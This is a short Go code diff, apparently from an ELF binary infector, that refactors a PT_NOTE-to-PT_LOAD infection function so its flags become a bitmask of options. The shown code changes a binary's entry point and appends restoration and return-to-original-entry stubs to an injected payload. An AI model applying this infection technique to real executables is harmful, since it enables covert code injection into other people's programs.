@@ -9,7 +9,7 @@ import (
 	"io/ioutil"
 )
 
-func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRetOEP bool) error {
+func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts, debug bool) error {
 	var noteNdx int
 
 	switch t.EIdent.Arch {
@@ -51,11 +51,11 @@ func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRe
 			fmt.Printf("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
 		}
 
-		if noRestoration == false {
+		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration64)
 		}
 
-		if noRetOEP == false {
+		if !((opts & NoRetOEP) == NoRetOEP) {
 			retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			t.Payload.Write(retStub)
 		}
